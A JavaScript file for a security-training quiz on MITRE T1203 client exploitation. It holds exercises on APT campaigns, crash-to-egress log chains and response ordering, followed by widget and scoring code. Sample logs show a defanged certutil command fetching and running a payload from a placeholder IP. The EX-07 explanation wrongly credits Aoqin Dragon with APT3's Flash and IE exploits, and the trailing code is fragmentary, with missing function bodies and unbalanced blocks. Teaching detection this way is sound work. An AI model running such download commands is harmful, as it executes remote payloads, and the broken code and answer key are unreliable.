var META={"topicId":"t1203","mitreId":"T1203","name":"Exploitation for Client Execution","mitreName":"Exploitation for Client Execution","objectType":"technique","title":"T1203 Exploitation for Client Execution — HARD","difficulty":"hard","severity":"hard","severityLabel":"HARD","batch":3,"questionCount":15,"estimatedMinutes":24,"passMark":70,"protocol":"cpa-staged-v1"};
var INTRO={"learnHtml":"<p><b>This is the working level of a senior analyst.<\/b> The chains are real: APT3 pairing a Flash zero-day (CVE-2015-3113) with an Internet Explorer zero-day (CVE-2014-1776) on one lure page; APT28 exploiting Office (CVE-2017-0262); admin@338 and Aoqin Dragon reusing the old Word bug CVE-2012-0158; Agent Tesla abusing Office CVE-2017-11882 / CVE-2017-8570; Andariel firing ActiveX zero-days; APT29 exploiting Word, Exchange and Adobe Reader.<\/p><p>You will sort real procedure examples from adjacent techniques, judge <b>weak versus strong signals<\/b> (a sandboxed renderer crash alone is noise; a broker spawning cmd.exe is not), spot <b>signed-updater look-alikes<\/b> that mimic C2 egress, and choose the <b>least aggressive response that still works<\/b> — because destroying evidence or over-reacting both lose cases.<\/p><p>Expect at least one plausible shortcut that leads to the wrong answer, and one artefact you must read from both the red side and the blue side.<\/p>","themes":[{"name":"The post-exploit EDR chain","concepts":["client app crash or abnormal exit","renderer crash vs broker child","benign signed updater look-alikes","C2-like egress","exploit chain staging"]},{"name":"Real campaigns and attribution","concepts":["APT3 Flash and IE zero-days","APT28 Office exploit","admin@338 Word exploit","Agent Tesla Office CVEs","Andariel ActiveX zero-days","Aoqin Dragon document exploits","APT29 Word and Reader exploits","Aoqin Dragon exploited CVEs"]},{"name":"Judgement under ambiguity","concepts":["legacy CVE on unpatched estate","least aggressive / safe-vs-destructive response","evidence preservation vs containment cost"]}]};
var EXERCISES=[{"id":"EX-01","type":"qcm-single","summary":"Why does a 2017 Office CVE still fire in 2023?","concepts":["APT28 Office exploit","legacy CVE on unpatched estate"],"scenario":"<p>Brief for the quarterly review: <b>APT28 (G0007)<\/b> is documented exploiting Office with <b>CVE-2017-0262<\/b>. In your 2023 estate the same public exploit signature fired on three hosts. Ticket #48213 shows those three hosts run Office 2016 builds that never received the 2017 security updates.<\/p>","question":"<p>What is the correct reading of this situation?<\/p>","options":["The CVE was never patched, so every Windows host stays vulnerable","APT28 must have found a new zero-day with the same CVE number","Old exploits still work where legacy Office builds never got the fix","Office exploits become undetectable once the patch exists"],"correct":2,"hint":"Check the patch report: were those three hosts ever fixed?","explanation":"<p>CVE-2017-0262 has had a fix since 2017 — it is an <b>n-day, not a zero-day<\/b>. It still fired because <b>unpatched legacy builds<\/b> remained in the estate; the exploit works wherever the fix never landed. The CVE number does not change, detection keeps working after a patch, and the other options contradict the patch report.<\/p>","study":"N-day vs zero-day exploitation; ATT&CK G0007 — Office CVE-2017-0262."},{"id":"EX-02","type":"line-select","summary":"Select the crash-to-egress lines that tie the APT3-style intrusion together.","concepts":["APT3 Flash and IE zero-days","client app crash or abnormal exit","C2-like egress"],"scenario":"<p>Unified log from VICTIM-WS14 during a suspected APT3-style operation (Flash + IE zero-days staged on one lure page). Three lines form the cause→effect chain; the rest is noise.<\/p>","question":"<p>Click the <b>three<\/b> lines that form the exploit chain.<\/p>","logLines":["10:02:14  proc   explorer.exe -&gt; iexplore.exe  (visit) hxxp[:]//news-daily[.]example-gazette[.]top/top-story","10:02:31  fault  plugin-container.exe (Flash) abnormal exit 0xC0000005","10:02:33  proc   iexplore.exe -&gt; cmd.exe /c %TEMP%\\flash[.]tmp","10:02:59  proc   cmd.exe -&gt; conhost.exe","10:03:18  net    cmd.exe child -&gt; 198[.]51[.]100[.]77:443 (new ASN, no DNS)","10:05:00  proc   iexplore.exe -&gt; iexplore.exe --session-merge (second tab)","10:11:47  net    svchost.exe -&gt; windowsupdate[.]com (vendor)","10:14:02  proc   explorer.exe -&gt; notepad.exe C:\\Users\\tom\\shift.txt"],"badLines":[1,2,4],"filterable":true,"hint":"Crash of the plugin, child launched by the browser, egress to a bare IP — in that order.","explanation":"<p>The chain: line 2 — the <b>Flash plugin crashes<\/b> (abnormal exit, the exploit corrupting memory); line 3 — <b>iexplore.exe spawns cmd.exe<\/b> to run the dropped %TEMP% file (unexpected child); line 5 — <b>egress to a bare IP<\/b> in a new ASN with no DNS (C2-like). The visit, conhost, second tab, vendor update and notepad lines are noise.<\/p>","study":"ATT&CK G0022 APT3 — CVE-2015-3113 (Flash) and CVE-2014-1776 (IE); detection AN0797 chain."},{"id":"EX-03","type":"multi-step","summary":"Decide on a browser crash that might be nothing.","concepts":["renderer crash vs broker child","client app crash or abnormal exit","least aggressive / safe-vs-destructive response"],"scenario":"<p>Night shift on LAB-WS3, a standard analyst workstation. Chrome crashes appear in the queue and you must separate noise from intrusion without over-reacting.<\/p>","question":"<p>Work through the three decisions.<\/p>","steps":[{"prompt":"09:00 — LAB-WS3: a chrome.exe renderer process crashed (0xC0000005). No file write, no child, no egress. The browser reopened fine. What now?","options":["Isolate the host and page the IR lead","Record it and keep watching — a sandboxed renderer crash alone is a weak signal","Reimage the host before the next shift"],"correct":1,"outcome":"Correct — renderer processes are sandboxed; a crash alone is common and harmless without the rest of the chain."},{"prompt":"10:40 — same host: chrome.exe crashed AND spawned mshta.exe with a script from %TEMP%. Egress to a bare IP followed 30 s later. What now?","options":["Isolate the workstation and capture the dropped script first","Nothing — browsers crash every day","Delete every file in %TEMP% on that host"],"correct":0,"outcome":"Correct — the full chain is present: contain, but collect the dropped script before any cleanup."},{"prompt":"The CISO asks for the single most valuable scoping step tonight.","options":["Change the user's password","Run a full chkdsk on the host","Pull proxy and DNS logs for that host around both timestamps"],"correct":2,"outcome":"Correct — egress logs give you the C2 destination and a pivot to other hosts that touched it."}],"hint":"Match the response strength to the signal strength; never destroy what you have not collected.","explanation":"<p>Step 1: a <b>renderer crash alone<\/b> is weak — renderer processes are sandboxed and crash for many reasons, so the least aggressive correct action is to watch. Step 2: crash + <b>mshta child from %TEMP%<\/b> + egress is the full chain — isolate, but preserve the dropped script (deleting %TEMP% destroys evidence). Step 3: <b>proxy and DNS logs<\/b> turn one host into estate-wide scope.<\/p>","study":"Renderer crash vs broker child; response ladder from least to most aggressive."},{"id":"EX-04","type":"fill-blank","summary":"Complete the brief: the CVE-2012-0158 overlap.","concepts":["admin@338 Word exploit","Aoqin Dragon document exploits"],"scenario":"<p>Finish the threat-brief paragraph that compares two campaigns reusing the same old Word bug.<\/p>","question":"<p>Complete the brief: admin@338 exploited Word CVE-<input1>, and Aoqin Dragon reused the same bug — both only ran after the user <input2> the file.<\/p>","template":"Brief: <b>admin@338<\/b> (G0018) sent spearphishing attachments that exploited Word CVE-<input1>, while <b>Aoqin Dragon<\/b> (G1007) reused the same bug alongside CVE-2010-3333 in themed documents — and both only ran after the user <input2> the file.","blanks":[{"answer":"2012-0158","alts":["2012 0158"],"placeholder":"CVE number","width":11},{"answer":"open","alts":["opened","opens","opening"],"placeholder":"verb","width":6}],"hint":"The Word bug both groups used in 2012; and the action the victim performs.","explanation":"<p>Both campaigns abused <b>CVE-2012-0158<\/b>, a Word/Office parsing bug: <b>admin@338<\/b> in spearphishing attachments, <b>Aoqin Dragon<\/b> paired with CVE-2010-3333 in themed documents. Neither ran by itself — both needed the user to <b>open<\/b> the file, the defining interaction of document exploitation.<\/p>","study":"ATT&CK procedure examples: G0018 admin@338 and G1007 Aoqin Dragon."},{"id":"EX-05","type":"qcm-single","summary":"RED view: name the staging step in the tree.","concepts":["exploit chain staging","APT3 Flash and IE zero-days"],"scenario":"<p>Red-team artefact from an APT3-style emulation on RANGE-PC7:<\/p><pre class=\"art mono\">10:02:31  fault  plugin-container.exe (Flash) crash 0xC0000005\n10:02:33  proc   iexplore.exe -&gt; cmd.exe /c %TEMP%\\flash[.]tmp\n10:02:36  proc   cmd.exe -&gt; certutil.exe -urlcache -f hxxp[:]//198[.]51[.]100[.]77/p pay.exe\n10:02:41  proc   cmd.exe -&gt; pay.exe\n10:02:58  net    pay.exe -&gt; 198[.]51[.]100[.]77:443  (beacon)<\/pre>","question":"<p>You are the <b>red team<\/b> writing the emulation report. Which line is the <b>stager-retrieval<\/b> step of the exploit chain?<\/p>","options":["The Flash plugin-container crash inside the browser","certutil.exe fetching pay.exe from the remote host","The beacon session to 198[.]51[.]100[.]77:443","iexplore.exe launching cmd.exe from %TEMP%"],"correct":1,"artifactNote":"Shared red/blue artefact — the same timeline is read from the blue side in EX-09.","hint":"Staging means pulling the next piece down — not the crash and not the beacon.","explanation":"<p>The <b>stager-retrieval<\/b> step is <b>certutil.exe fetching pay.exe<\/b>: the initial exploit code pulled the next-stage payload from the operator's host. The crash is the exploitation trigger, the cmd.exe launch is execution of the first stage, and the beacon is command-and-control — all earlier or later than staging.<\/p>","study":"Exploit chain anatomy: exploit → dropper/stager → payload → C2."},{"id":"EX-06","type":"drag-drop","summary":"Sort six items: T1203 procedure vs adjacent.","concepts":["APT28 Office exploit","Andariel ActiveX zero-days","Agent Tesla Office CVEs"],"scenario":"<p>A rusher on your team filed six items as \"exploitation\". Sort them properly before the report goes out.<\/p>","question":"<p>Place each item into the right bucket.<\/p>","bank":["APT28 — Office CVE-2017-0262 exploit in attachments","Andariel — ActiveX zero-days used for execution","Agent Tesla — Office CVE-2017-11882 / CVE-2017-8570","3CX — Chrome CVE-2022-0609 drive-by on a lure site","APT41 — BITSAdmin job to install a payload","APT39 — exfiltration over the BITS protocol"],"slots":[{"label":"Documented T1203 client-exploit procedure","accept":[0,1,2,3]},{"label":"Adjacent technique — not client exploitation","accept":[4,5]}],"hint":"Two items use BITS — that is a different ATT&CK technique, not client exploitation.","explanation":"<p>T1203 procedures: <b>APT28's<\/b> Office CVE-2017-0262, <b>Andariel's<\/b> ActiveX zero-days, <b>Agent Tesla's<\/b> Office CVE-2017-11882/8570, and the <b>3CX-linked Chrome CVE-2022-0609<\/b> drive-by. The two BITSAdmin/BITS items abuse the Background Intelligent Transfer Service — T1197-style abuse and exfiltration, not client exploitation; they only look like \"exploits\" on a fast read.<\/p>","study":"ATT&CK procedure examples for T1203 — and the contrast with T1197 BITS Jobs."},{"id":"EX-07","type":"matching","summary":"Attribute four exploit sets to the campaigns that used them.","concepts":["Aoqin Dragon exploited CVEs","APT29 Word and Reader exploits","Agent Tesla Office CVEs","Andariel ActiveX zero-days"],"scenario":"<p>Attribution card for the wall: four actors, four documented client-exploit sets from the ATT&amp;CK procedure table.<\/p>","question":"<p>Click an item on the left, then its match on the right.<\/p>","pairs":[{"left":"APT29 (G0016)","right":"Word, Exchange and Adobe Reader exploits"},{"left":"Agent Tesla (S0331)","right":"Office CVE-2017-11882 / CVE-2017-8570"},{"left":"Andariel (G0138)","right":"ActiveX zero-days against South Korean targets"},{"left":"Aoqin Dragon (G1007)","right":"exploited CVE-2012-0158 and CVE-2010-3333 against targeted systems"}],"hint":"One lure-page pair, one Word/Exchange/Reader triple, one Office pair, one ActiveX crew.","explanation":"<p><b>Aoqin Dragon<\/b> staged Flash and IE exploits together; <b>APT29<\/b> exploited Word, Exchange and Adobe Reader; <b>Agent Tesla<\/b> used the Office bugs CVE-2017-11882/CVE-2017-8570; <b>Andariel<\/b> used ActiveX zero-days. Every set runs code inside a client application — the defining mark of T1203.<\/p>","study":"ATT&CK T1203 'Procedure Examples' — G0022, G0016, S0331, G0138."},{"id":"EX-08","type":"terminal","summary":"Pull segfault lines for the crash window (Linux).","concepts":["client app crash or abnormal exit"],"scenario":"<p>Ubuntu bastion SRV-JMP-01. A browser on a suspect host crashed during the incident window and the kernel logged it. Standard GNU text tools are installed; the system log is at its usual location.<\/p>","question":"<p>Type the one-line command that prints every line containing the string <b>segfault<\/b> from <b>/var/log/syslog<\/b>.<\/p>","shellPrompt":"analyst@SRV-JMP-01:~$","expected":"grep segfault /var/log/syslog","elements":[{"any":["grep"],"label":"a stream filter tool"},{"any":["segfault"],"label":"the crash signature"},{"any":["/var/log/syslog"],"label":"the system log path"}],"hint":"One filter tool, one keyword, one file — in that order.","explanation":"<p><span class=\"mono\">grep segfault /var/log/syslog<\/span> prints the crash records — on Linux the first link of the T1203 chain is often a <b>segfault<\/b> entry naming the client binary. The next step is to correlate that timestamp with child-process and egress events. <span class=\"mono\">journalctl<\/span> can do the same on systemd hosts.<\/p>","study":"Linux crash triage: segfault lines in syslog/journal, then process and network correlation."}];

EXERCISES.push({"id":"EX-09","type":"qcm-single","summary":"BLUE view: which event fired first in the chain?","concepts":["renderer crash vs broker child","client app crash or abnormal exit"],"scenario":"<p>The same blue-side artefact from the APT3-style emulation on RANGE-PC7:<\/p><pre class=\"art mono\">10:02:31  fault  plugin-container.exe (Flash) crash 0xC0000005\n10:02:33  proc   iexplore.exe -&gt; cmd.exe /c %TEMP%\\flash[.]tmp\n10:02:36  proc   cmd.exe -&gt; certutil.exe -urlcache -f hxxp[:]//198[.]51[.]100[.]77/p pay.exe\n10:02:41  proc   cmd.exe -&gt; pay.exe\n10:02:58  net    pay.exe -&gt; 198[.]51[.]100[.]77:443  (beacon)<\/pre>","question":"<p>You are the <b>responder<\/b>. In this artefact, which event is the <b>earliest<\/b> signal you could have alerted on?<\/p>","options":["The beacon session to the bare-IP host","certutil.exe downloading pay.exe","The Flash plugin-container abnormal exit","cmd.exe spawning pay.exe"],"correct":2,"artifactNote":"Shared red/blue artefact — the same timeline is read from the red side in EX-05.","hint":"Walk the timestamps top to bottom — alert on the first cause, not the last effect.","explanation":"<p>The earliest event is the <b>plugin-container abnormal exit<\/b> at 10:02:31 — the crash caused by the exploit. The certutil fetch, the pay.exe launch and the beacon all happen after it. The tempting shortcut is to alert on the loud beacon, but by then the chain is finished; the abnormal exit is the first link of the cause→effect chain.<\/p>","study":"Detection AN0797 — alert on the first chain link; correlate the rest within the window."},
{"id":"EX-10","type":"ordering","summary":"Order the response steps for a confirmed chain.","concepts":["least aggressive / safe-vs-destructive response","evidence preservation vs containment cost"],"scenario":"<p>FIN-WS9 shows a confirmed Word chain: crash, Temp drop, powershell child, egress. Order the response so nothing is destroyed out of order.<\/p>","question":"<p>Order the steps from first to last.<\/p>","items":["Preserve volatile evidence: memory capture and process tree","Isolate the host from the network (keep it powered on)","Collect the dropped file, mailbox copy and proxy logs to scope","Reimage only after scope is signed off"],"hint":"Least aggressive first, destructive last — and never destroy what you have not collected.","explanation":"<p>Order: <b>preserve<\/b> volatile evidence while the host is still live → <b>isolate<\/b> from the network but keep it powered on → <b>collect<\/b> the artefacts that give scope (drop, mail, proxy) → <b>reimage<\/b> only when scope is signed off. Reimaging early wipes the very evidence that proves how far the intruder reached.<\/p>","study":"IR containment ladder: preserve → isolate → collect → eradicate."},
{"id":"EX-11","type":"qcm-multi","summary":"Pick the two hosts to patch first tonight.","concepts":["legacy CVE on unpatched estate","Agent Tesla Office CVEs"],"scenario":"<p>Agent Tesla campaigns are documented exploiting Office CVE-2017-11882 / CVE-2017-8570. Tonight's emergency window covers two hosts. Patch report:<\/p><pre class=\"art mono\">HOST         OFFICE      MISSING KBs          MAIL USE\nHR-WS07      2016 MSI    KB4011052            heavy attachments\nDEV-LIN03    (Libre)     none missing         none\nSALES-WS12   2010 SP2    KB4011200, KB3191... heavy attachments\nDC01         none        n/a                  none<\/pre>","question":"<p>Select the <b>two<\/b> hosts to patch first tonight.<\/p>","options":["HR-WS07 — old Office build, missing security KBs, heavy attachment traffic","DEV-LIN03 — current LibreOffice, no Outlook mailbox","SALES-WS12 — unpatched Office 2010 SP2 opening invoices daily","DC01 — server without Office or a mail client"],"correct":[0,2],"hint":"Old build + missing security KBs + real exposure to attachments = priority.","explanation":"<p><b>HR-WS07<\/b> and <b>SALES-WS12<\/b> combine an unpatched Office build (the Agent Tesla CVEs are patched in those KBs) with <b>daily attachment exposure<\/b>. DEV-LIN03 runs current software with no mail exposure, and DC01 has no client apps at all — nothing for a document exploit to bite on.<\/p>","study":"Patch prioritisation: exploitability × exposure; ATT&CK S0331 Agent Tesla."},
{"id":"EX-12","type":"line-select","summary":"Separate the true exploit-chain lines from signed look-alike noise.","concepts":["benign signed updater look-alikes","client app crash or abnormal exit","C2-like egress"],"scenario":"<p>Merged EDR view from FIN-WS4. Some lines look suspicious but are routine; the chain is real.<\/p>","question":"<p>Click the <b>three<\/b> lines that form the exploit chain.<\/p>","logLines":["13:01:02  proc  explorer.exe -&gt; WINWORD.EXE  open budget_review.docx","13:01:40  fault WINWORD.EXE abnormal exit 0xC0000005","13:01:41  proc  WINWORD.EXE -&gt; rundll32.exe C:\\Users\\ivy\\AppData\\Local\\Temp\\mshtml[.]dat,Entry","13:02:00  net   Teams.exe -&gt; teams[.]microsoft[.]com (signed updater)","13:02:12  net   rundll32.exe child -&gt; 203[.]0[.]113[.]88:443 (bare IP, 31 s after crash)","13:03:33  proc  OneDrive.exe -&gt; OneDriveStandaloneUpdater.exe (signed, vendor)","13:04:10  proc  WINWORD.EXE restarted by user; file opens in Protected View; no children"],"badLines":[1,2,4],"hint":"Word crashing, then launching rundll32 against a Temp file, then that child hitting a bare IP — the signed updater lines are the look-alikes.","explanation":"<p>The chain: line 2 — Word's <b>abnormal exit<\/b>; line 3 — Word spawning <b>rundll32.exe on a Temp file<\/b> (unexpected child); line 5 — that child's <b>egress to a bare IP<\/b> 31 seconds after the crash (C2-like). The Teams and OneDrive lines are <b>signed vendor updaters<\/b> — they mimic C2 on a fast read but go to vendor domains on known, signed binaries.<\/p>","study":"Distinguish signed updater traffic from C2: publisher, destination reputation, and timing relative to the chain."},
{"id":"EX-13","type":"fill-blank","summary":"Complete the APT3 double-zero-day brief.","concepts":["APT3 Flash and IE zero-days"],"scenario":"<p>Finish the brief paragraph about APT3's 2015 staged landing page.<\/p>","question":"<p>Complete: APT3 paired the Flash zero-day CVE-<input1> with the Internet Explorer zero-day CVE-<input2> on one lure page.<\/p>","template":"Brief: in 2015 <b>APT3<\/b> (G0022) staged a landing page that paired the Flash zero-day CVE-<input1> with the Internet Explorer zero-day CVE-<input2>, so the second exploit fired if the first failed.","blanks":[{"answer":"2015-3113","alts":["2015 3113"],"placeholder":"year-number","width":11},{"answer":"2014-1776","alts":["2014 1776"],"placeholder":"year-number","width":11}],"hint":"Both years appear in the brief text: Flash in 2015, IE in 2014.","explanation":"<p>APT3 paired <b>CVE-2015-3113<\/b> (Adobe Flash) with <b>CVE-2014-1776<\/b> (Internet Explorer) — a belt-and-braces page where the browser exploit fires if the plugin exploit fails. This is why drive-by detection watches the whole client stack, not just one app.<\/p>","study":"ATT&CK G0022 APT3 — the paired Flash and IE exploits."},
{"id":"EX-14","type":"multi-step","summary":"Resolve a 3 a.m. egress with conflicting signals.","concepts":["benign signed updater look-alikes","client app crash or abnormal exit","least aggressive / safe-vs-destructive response"],"scenario":"<p>Overnight shift. The proxy queue has one host that will take three decisions to resolve — and the on-call senior wants to isolate first and think later.<\/p>","question":"<p>Work through the three decisions.<\/p>","steps":[{"prompt":"03:14 — proxy: WORKST5-11 sends 2 MB to 45[.]33[.]32[.]188:443. EDR shows NO crash, NO child, NO file write that night. The senior wants to isolate immediately as 'probable exploitation'. Your read?","options":["Isolate now — any night-time egress is an intrusion","Attribute first: with no chain signals, check which process made the connection","Close it as a false positive without further checks"],"correct":1,"outcome":"Correct — without the chain you cannot call it T1203; attribute the egress to a process before acting."},{"prompt":"Flow data: the connection came from OneDriveUpdater.exe to a Microsoft CDN range, certificate valid, publisher signed. Verdict?","options":["Benign scheduled update — annotate and monitor","APT3 staging — reimage the host","Disable OneDrive fleet-wide tonight"],"correct":0,"outcome":"Correct — known publisher, vendor range, no chain; fleet-wide changes would cost more than the risk they remove."},{"prompt":"Next morning the same host: WINWORD crash + %TEMP% drop + powershell child within one minute. Now?","options":["Confirmed chain — isolate, preserve evidence, pull the mail trail","Wait 24 hours to see if it repeats","Only re-run the antivirus scan"],"correct":0,"outcome":"Correct — now the full cause→effect chain exists; contain and collect immediately."}],"hint":"Exploitation needs the chain; a lone egress is only a question until a process answers it.","explanation":"<p>Step 1: with <b>no crash, child or drop<\/b>, an egress alone cannot be T1203 — attribute it first (the tempting 'isolate everything' shortcut over-reacts). Step 2: a <b>signed vendor updater<\/b> to the vendor's CDN is the classic benign look-alike — annotate, don't escalate. Step 3: the <b>full chain<\/b> changes everything — isolate, preserve, and scope by the mail trail.<\/p>","study":"Benign signed updater look-alikes; the four-link chain as the trigger for containment."},
{"id":"EX-15","type":"qcm-single","summary":"Which observation separates the three suspect hosts?","concepts":["benign signed updater look-alikes","client app crash or abnormal exit"],"scenario":"<p>Alert storm: 30 hosts show <span class=\"mono\">WINWORD.EXE -&gt; cmd.exe<\/span> after a marketing mail-out. On 27 hosts the command line is <span class=\"mono\">cmd.exe /c \"C:\\Program Files\\Tailor Add-in\\register.cmd\"<\/span> — a signed vendor add-in, no file drop, no egress. Three hosts instead show a %TEMP% drop and a powershell child.<\/p>","question":"<p>Which observation most strongly separates the three suspect hosts from the 27?<\/p>","options":["The suspect hosts show a %TEMP% file drop and a powershell child from Word","The 27 hosts ran a cmd.exe child, which is always malicious","The mail-out was sent during normal working hours for the region","The add-in vendor had published a correctly signed new build"],"correct":0,"hint":"Look for the chain signals that the 27 hosts do NOT have.","explanation":"<p>The separator is the rest of the <b>chain<\/b>: a <b>%TEMP% drop plus a powershell child<\/b> on the three hosts. A cmd.exe child alone is not 'always malicious' — the 27 are a signed add-in with no drop and no egress, i.e. benign. Send times and the vendor's signed build say nothing about exploitation.<\/p>","study":"Alert triage: separate look-alike children by the presence of drop and egress signals."});

    how.appendChild(el('div', 'typlist', '<span class="typ">' + META.questionCount + ' exercises</span><span class="typ">timer ' + fmtTime((META.estimatedMinutes || 15) * 60) + '</span><span class="typ">pass 70%</span><span class="typ">severity: ' + esc(META.severityLabel) + '</span>'));

  /* ---------------- widgets ---------------- */

    b.type = 'button'; b.dataset.idx = idx;

  }
  function widgetFor(ex, box, wstate) {
    if (ex.type === 'qcm-single' || ex.type === 'qcm-multi') {
      var wrap = el('div', null, '');
      wstate.sel = wstate.sel || [];
      ex.options.forEach(function (o, i) {
        var r = optRow(i, o);
        if (wstate.sel.indexOf(i) >= 0) r.classList.add('sel');
        r.addEventListener('click', function () {

    } else if (ex.type === 'fill-blank') {

          inp.setAttribute('aria-label', 'Blank ' + (bi + 1));

    } else if (ex.type === 'drag-drop') {

    } else if (ex.type === 'ordering') {

    } else if (ex.type === 'matching') {

      }
      drawMatch();
      mw.appendChild(lcol); mw.appendChild(rcol); box.appendChild(mw);
      var un = el('button', 'btn btn-ghost matchundo', '↺ Undo all pairs');
      un.type = 'button';
      un.addEventListener('click', function () { if (S.answers[S.current].status === 'checked') return; wstate.assign = {}; wstate.activeLeft = null; drawMatch(); });
      box.appendChild(un);
    } else if (ex.type === 'terminal') {
      wstate.cmd = wstate.cmd || '';
      var term = el('div', 'term');
      term.appendChild(el('div', 't-bar',
        '<span class="t-dot d-r"></span><span class="t-dot d-a"></span><span class="t-dot d-g"></span><span class="t-title">' + esc(ex.shellPrompt || 'shell') + ' — type the command, then press Enter or Check</span>'));
      var body = el('div', 't-body');
      var hist = el('div', 't-hist'); hist.textContent = wstate.cmd ? wstate.cmd : '';
      var inrow = el('div', 't-in');
      var pr = el('span', 'pr', esc(ex.shellPrompt || '$'));
      var inp = document.createElement('input');
      inp.type = 'text'; inp.value = wstate.cmd; inp.setAttribute('aria-label', 'Terminal command input'); inp.autocomplete = 'off'; inp.spellcheck = false;
      inp.addEventListener('input', function () { wstate.cmd = inp.value; hist.textContent = ''; });
      inp.addEventListener('keydown', function (ev) { if (ev.key === 'Enter') { ev.preventDefault(); doCheck(); } });
      inrow.appendChild(pr); inrow.appendChild(inp);
      body.appendChild(hist); body.appendChild(inrow); term.appendChild(body);
      box.appendChild(term);
      if (ex.syntaxPanel) box.appendChild(el('div', 'syntax', ex.syntaxPanel));
      setTimeout(function () { try { inp.focus(); } catch (e) { } }, 60);
    } else if (ex.type === 'line-select') {
      wstate.sel = wstate.sel || [];
      var lv = el('div', 'logview');
      var bar = el('div', 'lv-bar', '<span class="lv-tag">FILTER</span>');
      var finp = document.createElement('input');
      finp.type = 'text'; finp.placeholder = ex.filterable ? 'filter lines… (visual aid only)' : 'visual filter…';
      finp.setAttribute('aria-label', 'Filter log lines');

      var lines = el('div', 'lv-lines');
      function drawLines(f) {

          row.appendChild(el('span', 'ln', String(i + 1)));
          row.appendChild(el('span', null, esc(l)));
          row.addEventListener('click', function () {
            if (S.answers[S.current].status === 'checked') return;
            var p = wstate.sel.indexOf(i); if (p >= 0) { wstate.sel.splice(p, 1); row.classList.remove('sel'); row.setAttribute('aria-label', 'Log line ' + (i + 1)); }
            else { wstate.sel.push(i); row.classList.add('sel'); }
          });

      }
      drawLines('');
      finp.addEventListener('input', function () { drawLines(finp.value.trim()); });

    } else if (ex.type === 'multi-step') {
      wstate.step = wstate.step === undefined ? 0 : wstate.step;
      wstate.picks = wstate.picks || {};
      wstate.stepSel = wstate.stepSel === undefined ? null : wstate.stepSel;
      drawStep();
    }
    function drawStep() {
      var sw = el('div', null, '');
      /* outcomes of already-confirmed intermediate steps */
      for (var done = 0; done < wstate.step; done++) {
        var pk = wstate.picks[done];
        var okv = pk === ex.steps[done].correct;
        sw.appendChild(el('div', 'outcome', (okv ? '✓ ' : '✗ ') + 'Step ' + (done + 1) + ' confirmed — the scenario continues. ' + esc(ex.steps[done].outcome || '') + (done === wstate.step - 1 ? ' <b>Intermediate step: the timer keeps running.</b>' : '')));
      }
      var st = ex.steps[wstate.step];
      sw.appendChild(el('span', 'step-h', '⎘ STEP ' + (wstate.step + 1) + ' OF ' + ex.steps.length));
      sw.appendChild(el('div', 'block-b', st.prompt));
      var confirmBtn = null;
      st.options.forEach(function (o, i) {
        var r = optRow(i, o);
        if (wstate.stepSel === i) r.classList.add('sel');
        r.addEventListener('click', function () {
          if (wstate.picks[wstate.step] !== undefined) return;
          wstate.stepSel = i;
          sw.querySelectorAll('.opt').forEach(function (x) { x.classList.remove('sel'); });
          r.classList.add('sel');
          if (confirmBtn) confirmBtn.disabled = false;
        });
        sw.appendChild(r);
      });
      confirmBtn = el('button', 'btn btn-blue', (wstate.step === ex.steps.length - 1 ? '✓ Confirm final step & check' : '→ Confirm step'));
      confirmBtn.type = 'button'; confirmBtn.disabled = wstate.stepSel === null;
      confirmBtn.setAttribute('aria-label', 'Confirm step ' + (wstate.step + 1));
      confirmBtn.addEventListener('click', function () {
        if (wstate.stepSel === null || wstate.picks[wstate.step] !== undefined) return;
        wstate.picks[wstate.step] = wstate.stepSel;
        wstate.stepSel = null;
        if (wstate.step < ex.steps.length - 1) {

        } else {

        }

      sw.appendChild(confirmBtn);
      box.innerHTML = '';
      box.appendChild(sw);
    }
  }

  /* ---------------- scoring ---------------- */
  function scoreExercise(ex, wstate) {
    var items = [], N = 0, H = 0, W = 0, canon = null;
    function item(state, label) { items.push({ state: state, label: label }); }
    if (ex.type === 'qcm-single') {
      N = 1;
      var sel = wstate.sel && wstate.sel[0];
      if (sel === undefined) { item('mi', 'No option selected'); }
      else if (sel === ex.correct) { H = 1; item('ok', '✓ Correct — ' + strip(ex.options[ex.correct])); }
      else { W = 1; item('no', '✗ You chose: ' + strip(ex.options[sel])); }
      canon = ex.options[ex.correct];
    } else if (ex.type === 'qcm-multi') {
      N = ex.correct.length;
      var selset = wstate.sel || [];
      ex.correct.forEach(function (ci) {
        if (selset.indexOf(ci) >= 0) { H++; item('ok', '✓ Correct: ' + strip(ex.options[ci])); }
        else { item('mi', '○ Missed: ' + strip(ex.options[ci])); }
      });
      selset.forEach(function (si) { if (ex.correct.indexOf(si) < 0) { W++; item('no', '✗ Wrong: ' + strip(ex.options[si])); } });
      canon = ex.correct.map(function (ci) { return strip(ex.options[ci]); }).join(' · ');
    } else if (ex.type === 'fill-blank') {
      N = ex.blanks.length;
      ex.blanks.forEach(function (bl, bi) {
        var v = norm(wstate.vals && wstate.vals[bi]);
        var accept = [norm(bl.answer)].concat((bl.alts || []).map(norm));
        if (!v) { item('mi', '○ Missed blank ' + (bi + 1) + ' — expected: ' + esc(bl.answer)); }
        else if (accept.indexOf(v) >= 0) { H++; item('ok', '✓ Blank ' + (bi + 1) + ': ' + esc(bl.answer)); }
        else { W++; item('no', '✗ Blank ' + (bi + 1) + ' — you typed "' + esc(v) + '", expected: ' + esc(bl.answer)); }
      });
      canon = ex.blanks.map(function (bl) { return bl.answer; }).join(' | ');
    } else if (ex.type === 'drag-drop') {
      N = ex.bank.length;
      Object.keys(wstate.place || {}).forEach(function (k) {
        var bi = parseInt(k, 10), si = wstate.place[k];
        if (ex.slots[si] && ex.slots[si].accept.indexOf(bi) >= 0) { H++; item('ok', '✓ "' + strip(ex.bank[bi]) + '" → ' + esc(ex.slots[si].label)); }
        else { W++; item('no', '✗ "' + strip(ex.bank[bi]) + '" does not belong in ' + esc(ex.slots[si] ? ex.slots[si].label : '?')); }
      });
      ex.bank.forEach(function (t, bi) { if (wstate.place[bi] === undefined) item('mi', '○ Missed: "' + strip(t) + '" → ' + esc(slotLabelFor(ex, bi))); });
      canon = ex.slots.map(function (sl) { return sl.label + ': ' + sl.accept.map(function (bi) { return strip(ex.bank[bi]); }).join(', '); }).join(' | ');
    } else if (ex.type === 'ordering') {
      N = ex.items.length;
      var order = wstate.order || [];
      order.forEach(function (bi, pos) {
        if (bi === pos) { H++; item('ok', '✓ Position ' + (pos + 1) + ': ' + strip(ex.items[pos])); }
        else { W++; item('no', '✗ Position ' + (pos + 1) + ' — you put "' + strip(ex.items[bi]) + '", expected "' + strip(ex.items[pos]) + '"'); }
      });
      canon = ex.items.map(function (t, i) { return (i + 1) + '. ' + strip(t); }).join(' ');
    } else if (ex.type === 'matching') {
      N = ex.pairs.length;
      ex.pairs.forEach(function (p, li) {
